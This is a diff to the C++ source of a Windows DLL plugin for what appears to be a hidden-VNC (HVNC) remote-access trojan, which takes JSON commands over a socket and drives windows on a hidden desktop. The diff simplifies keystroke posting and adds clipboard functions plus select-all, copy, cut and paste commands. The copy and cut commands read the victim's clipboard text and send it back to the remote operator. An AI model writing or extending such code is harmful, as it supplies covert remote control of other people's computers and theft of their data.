@@ -787,12 +787,6 @@ static bool send_mouse_input(int normX, int normY, DWORD flags, DWORD mouseData 
 static LPARAM key_lparam(WORD vk, bool keyUp) {
     UINT scan = MapVirtualKeyW(vk, MAPVK_VK_TO_VSC);
     LPARAM lp = 1 | (scan << 16);
-    if (vk == VK_RMENU || vk == VK_RCONTROL || vk == VK_INSERT || vk == VK_DELETE ||
-        vk == VK_HOME || vk == VK_END || vk == VK_PRIOR || vk == VK_NEXT ||
-        vk == VK_LEFT || vk == VK_RIGHT || vk == VK_UP || vk == VK_DOWN ||
-        vk == VK_DIVIDE || vk == VK_NUMLOCK) {
-        lp |= 0x01000000; // Extended key bit
-    }
     if (keyUp) lp |= 0xC0000000;
     return lp;
 }
@@ -940,17 +934,9 @@ static void input_loop() {
             if (!hTarget || !IsWindow(hTarget)) continue;
 
             if (action == "hvnc_keydown") {
-                WPARAM wParam = vk;
-                if (vk == VK_LCONTROL || vk == VK_RCONTROL) wParam = VK_CONTROL;
-                else if (vk == VK_LMENU || vk == VK_RMENU) wParam = VK_MENU;
-                else if (vk == VK_LSHIFT || vk == VK_RSHIFT) wParam = VK_SHIFT;
-                PostMessageW(hTarget, WM_KEYDOWN, wParam, key_lparam((WORD)vk, false));
+                PostMessageW(hTarget, WM_KEYDOWN, (WPARAM)vk, key_lparam((WORD)vk, false));
             } else if (action == "hvnc_keyup") {
-                WPARAM wParam = vk;
-                if (vk == VK_LCONTROL || vk == VK_RCONTROL) wParam = VK_CONTROL;
-                else if (vk == VK_LMENU || vk == VK_RMENU) wParam = VK_MENU;
-                else if (vk == VK_LSHIFT || vk == VK_RSHIFT) wParam = VK_SHIFT;
-                PostMessageW(hTarget, WM_KEYUP, wParam, key_lparam((WORD)vk, true));
+                PostMessageW(hTarget, WM_KEYUP, (WPARAM)vk, key_lparam((WORD)vk, true));
             } else if (action == "hvnc_char") {
                 // Doğrudan WM_CHAR post et
                 PostMessageW(hTarget, WM_CHAR, (WPARAM)vk, 1);  // lParam genelde 1 (repeat count)
@@ -1239,6 +1225,37 @@ extern "C" __declspec(dllexport) void RunPlugin(SOCKET sock) {
     g_socket = sock;
 }
 
+
+static void set_clipboard_text(const wstring& text) {
+    if (!OpenClipboard(NULL)) return;
+    EmptyClipboard();
+    HGLOBAL hGlob = GlobalAlloc(GMEM_MOVEABLE, (text.size() + 1) * sizeof(wchar_t));
+    if (hGlob) {
+        wchar_t* pLocked = (wchar_t*)GlobalLock(hGlob);
+        if (pLocked) {
+            memcpy(pLocked, text.c_str(), (text.size() + 1) * sizeof(wchar_t));
+            GlobalUnlock(hGlob);
+            SetClipboardData(CF_UNICODETEXT, hGlob);
+        }
+    }
+    CloseClipboard();
+}
+
+static wstring get_clipboard_text() {
+    wstring res;
+    if (!OpenClipboard(NULL)) return res;
+    HANDLE hData = GetClipboardData(CF_UNICODETEXT);
+    if (hData) {
+        wchar_t* pLocked = (wchar_t*)GlobalLock(hData);
+        if (pLocked) {
+            res = pLocked;
+            GlobalUnlock(hData);
+        }
+    }
+    CloseClipboard();
+    return res;
+}
+
 extern "C" __declspec(dllexport) void HandleCommand(SOCKET sock, const char* cmdJson) {
     try {
         json   cmd    = json::parse(cmdJson);
@@ -1429,6 +1446,36 @@ extern "C" __declspec(dllexport) void HandleCommand(SOCKET sock, const char* cmd
                     send_status("Process started on hidden desktop");
                 } else {
                     send_error("Failed to start process. Error: " + to_string(GetLastError()));
+                }
+            }
+        } else if (action == "hvnc_selectall") {
+            HWND hTarget = GetFocusedWindow();
+            if (hTarget) {
+                PostMessageW(hTarget, EM_SETSEL, 0, -1);
+                PostMessageW(hTarget, WM_COMMAND, 0xE122, 0);
+            }
+        } else if (action == "hvnc_copy" || action == "hvnc_cut") {
+            HWND hTarget = GetFocusedWindow();
+            if (hTarget) {
+                SendMessageW(hTarget, (action == "hvnc_copy") ? WM_COPY : WM_CUT, 0, 0);
+                thread([]() {
+                    Sleep(200);
+                    wstring text = get_clipboard_text();
+                    if (!text.empty()) {
+                        json resp;
+                        resp["action"] = "hvnc_clipboard";
+                        resp["text"] = wstring_to_utf8(text);
+                        safe_send_json(g_socket, resp);
+                    }
+                }).detach();
+            }
+        } else if (action == "hvnc_paste") {
+            HWND hTarget = GetFocusedWindow();
+            if (hTarget) {
+                string text = cmd.value("text", "");
+                if (!text.empty()) {
+                    set_clipboard_text(utf8_to_wstring(text));
+                    PostMessageW(hTarget, WM_PASTE, 0, 0);
                 }
             }
         } else if (action.find("hvnc_mouse") != string::npos ||
